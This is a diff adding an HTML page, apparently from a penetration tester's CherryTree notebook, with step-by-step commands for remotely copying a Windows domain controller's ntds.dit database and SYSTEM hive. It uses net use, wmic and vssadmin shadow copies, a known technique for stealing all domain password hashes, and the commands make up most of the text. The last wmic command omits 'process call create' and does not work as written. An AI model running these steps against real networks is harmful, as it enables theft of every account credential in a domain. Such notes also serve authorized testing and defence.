@@ -1,0 +1,50 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>recover ntds.dit from another Windows machine</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>recover ntds.dit from another Windows machine</h1><br /><br />1. Autheticate with the Domain
+    Controller<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;net&nbsp;use&nbsp;\\&lt;hostname-DC&gt;&nbsp;/user:&lt;DOMAIN&gt;\&lt;username-admin&gt;&nbsp;&lt;password&gt;<br />PS&gt;&nbsp;dir&nbsp;\\TESTDC\C$\<span
+          style="color:#000000;font-weight:400">&lt;</span>path<span style="color:#000000;font-weight:400">&gt;</span>
+      </div>
+    </div><br /> <a href=""><img src="images/1195-1.png" alt="images/1195-1.png" /></a><br /> <a href=""><img
+        src="images/1195-2.png" alt="images/1195-2.png" /></a><br />2. List the current volume shadow copies, to see if
+    we need to create one or there is already at least one<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;wmic&nbsp;/node:&lt;hostname-DC&gt;&nbsp;/user:&lt;DOMAIN&gt;\&lt;username-admin&gt;&nbsp;/password:&lt;password&gt;&nbsp;process&nbsp;call&nbsp;create&nbsp;&quot;cmd&nbsp;/c&nbsp;vssadmin&nbsp;list&nbsp;shadows&nbsp;2&gt;&amp;1&nbsp;&gt;&nbsp;C:\Users\Administrator\Desktop\listVolumeShadowCopies.txt&quot;<br />PS&gt;&nbsp;type&nbsp;\\&lt;hostname-DC&gt;\C$\Users\Administrator\Desktop\listVolumeShadowCopies.txt
+      </div>
+    </div><br /> <a href=""><img src="images/1195-3.png" alt="images/1195-3.png" /></a><br /> <a href=""><img
+        src="images/1195-4.png" alt="images/1195-4.png" /></a><br />3. How create a new Shadow copy<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;wmic&nbsp;/node:&lt;hostname-DC&gt;&nbsp;/user:&lt;DOMAIN&gt;\&lt;username-admin&gt;&nbsp;/password:&lt;password&gt;&nbsp;process&nbsp;call&nbsp;create&nbsp;&quot;cmd&nbsp;/c&nbsp;vssadmin&nbsp;create&nbsp;shadow&nbsp;/for=C:&nbsp;2&gt;&amp;1&nbsp;&gt;&nbsp;C:\Users\Administrator\Desktop\outputVssadmin.txt&quot;<br />PS&gt;&nbsp;type&nbsp;\\&lt;hostname-DC&gt;\C$\Users\Administrator\Desktop\outputVssadmin.txt
+      </div>
+    </div><br /> <a href=""><img src="images/1195-5.png" alt="images/1195-5.png" /></a><br />4. Copy SYSTEM and ntds.dit
+    file<br /> ◇ SYSTEM file<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;wmic&nbsp;/node:&lt;hostname-DC&gt;&nbsp;/user:&lt;DOMAIN&gt;\&lt;username-admin&gt;&nbsp;/password:&lt;password&gt;&nbsp;process&nbsp;call&nbsp;create&nbsp;&quot;cmd&nbsp;/c&nbsp;copy&nbsp;\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\System32\config\SYSTEM&nbsp;C:\Users\Administrator\Desktop\SYSTEM&quot;
+      </div>
+    </div><br /> ◇ ntds.dit file<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;wmic&nbsp;/node:&lt;hostname-DC&gt;&nbsp;/user:&lt;DOMAIN&gt;\&lt;username-admin&gt;&nbsp;/password:&lt;password&gt;&nbsp;&quot;cmd&nbsp;/c&nbsp;copy&nbsp;\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\NTDS\ntds.dit&nbsp;C:\Users\Administrator\Desktop\ntds.dit&quot;
+      </div>
+    </div><br /> <a href=""><img src="images/1195-6.png" alt="images/1195-6.png" /></a><br /> <br />Bibliography:<br />•
+    <a
+      href="https://malicious.link/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" target="_blank">https://malicious.link/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/</a>
+  </div>
+</body>
+
+</html>
